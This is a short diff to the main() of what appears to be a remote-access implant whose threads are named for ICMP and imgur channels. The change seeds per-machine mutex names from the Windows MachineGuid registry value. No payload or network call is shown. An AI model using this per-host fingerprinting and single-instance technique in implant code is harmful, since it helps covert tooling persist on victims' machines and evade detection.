@@ -33,12 +33,35 @@
 void icmp_thread(context& ctx);
 void imgur_thread(context& ctx);
 
+extern uint64_t deterministic_uuid_seed;
+
 int main()
 {
+    // Use unique per-machine GUID to seed generation of deterministic GUIDs to make them unique on each machine.
+    deterministic_uuid_seed = vr_shared_key;
+    HKEY hKey = nullptr;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Cryptography", 0, KEY_QUERY_VALUE|KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
+    {
+        union
+        {
+            char machine_guid[40];
+            uint64_t n[5];
+        } u{};
+        DWORD guid_size = sizeof(u.machine_guid);
+        DWORD key_type = REG_SZ;
+        if (RegQueryValueExA(hKey, "MachineGuid", nullptr, &key_type, (LPBYTE)u.machine_guid, &guid_size) == ERROR_SUCCESS)
+        {
+            for (uint64_t k : u.n)
+                deterministic_uuid_seed ^= k;
+        }
+        RegCloseKey(hKey);
+        hKey = nullptr;
+    }
+
     // Single instance mutex
     HANDLE hMutex = nullptr;
     {
-        stl::string vr_mutex = "Global\\" + deterministic_uuid(vr_shared_key + vr_mutant_main_instance);
+        stl::string vr_mutex = "Global\\" + deterministic_uuid(vr_mutant_main_instance);
         hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, vr_mutex.c_str());
         if (!hMutex)
             hMutex = CreateMutexA(nullptr, 0, vr_mutex.c_str());
